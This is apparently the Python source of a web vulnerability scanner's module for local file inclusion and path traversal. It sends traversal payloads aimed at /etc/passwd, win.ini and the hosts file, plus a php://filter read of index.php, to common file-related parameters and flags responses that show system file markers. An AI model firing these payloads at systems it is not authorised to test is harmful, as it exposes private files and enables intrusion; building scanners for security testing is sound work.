from __future__ import annotations

import asyncio
import urllib.parse

from .common import Finding, ScanContext, VulnerabilityModule, url_with_params
from .payload_utils import lfi_payloads


class LfiModule(VulnerabilityModule):
    name = "lfi"

    PARAMS = [
        "file",
        "path",
        "page",
        "include",
        "template",
        "view",
        "doc",
        "document",
        "load",
        "read",
        "src",
        "resource",
    ]

    PAYLOADS = [
        ("../../../etc/passwd", "root:x:"),
        ("../../../../etc/passwd", "root:x:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:x:"),
        ("....//....//....//etc/passwd", "root:x:"),
        ("../../../windows/win.ini", "[extensions]"),
        ("../../../../windows/system32/drivers/etc/hosts", "localhost"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
    ]

    async def run(self, ctx: ScanContext) -> list[Finding]:
        candidates = self._candidate_urls(ctx)
        payloads = lfi_payloads(ctx.wordlists, self.PAYLOADS, limit=max(ctx.limits.max_tests_per_module, 80))
        findings: list[Finding] = []
        tested = 0
        lock = asyncio.Lock()

        probe_specs: list[tuple[str, str, str, str]] = []
        for url, params in candidates:
            for param in params[:10]:
                if not any(token in param.lower() for token in self.PARAMS):
                    continue
                for payload, marker in payloads:
                    if len(probe_specs) >= ctx.limits.max_tests_per_module:
                        break
                    probe_specs.append((url, param, payload, marker))
        if not probe_specs:
            for param in self.PARAMS[:8]:
                for payload, marker in payloads:
                    if len(probe_specs) >= ctx.limits.max_tests_per_module:
                        break
                    probe_specs.append((ctx.target.url, param, payload, marker))

        baselines: dict[tuple[str, str], object | None] = {}
        for url, param in dict.fromkeys((url, param) for url, param, _payload, _marker in probe_specs):
            baselines[(url, param)] = await ctx.http.request(
                "GET", url, params={param: "scan_titan_control"}
            )

        async def probe(
            url: str,
            param: str,
            payload: str,
            marker: str,
            baseline: object | None,
        ) -> None:
            nonlocal tested
            async with lock:
                tested += 1
                if tested == 1 or tested % 20 == 0:
                    ctx.heartbeat(self.name, f"{param}={payload[:28]}", tested, len(findings))
            result = await ctx.http.request("GET", url, params={param: payload})
            if not result or not baseline or int(result.status or 0) >= 400:
                return
            if marker not in result.text or marker in baseline.text:
                return
            findings.append(
                Finding(
                    target=ctx.target.display,
                    category="LFI",
                    severity="Critical",
                    title=f"LFI / Path Traversal: {param}",
                    url=url_with_params(url, {param: payload}),
                    endpoint=urllib.parse.urlparse(url).path or "/",
                    param=param,
                    method="GET",
                    payload=payload,
                    status=str(result.status),
                    size=f"{result.body_len}b",
                    elapsed=f"{result.elapsed:.2f}s",
                    evidence=f"Differential system file marker observed only after traversal payload: {marker}",
                    source=self.name,
                    confidence="high",
                    evidence_strength="strong",
                    false_positive_risk="low",
                )
            )

        tasks = [
            probe(url, param, payload, marker, baselines.get((url, param)))
            for url, param, payload, marker in probe_specs
        ]
        await asyncio.gather(*tasks)
        return findings

    def _candidate_urls(self, ctx: ScanContext) -> list[tuple[str, list[str]]]:
        candidates = [(ctx.target.url, self.PARAMS)]
        for endpoint in ctx.recon.get("endpoints", [])[:40]:
            url = endpoint.get("url")
            params = endpoint.get("params") or []
            if url:
                candidates.append((url, params or self.PARAMS[:4]))
        return candidates
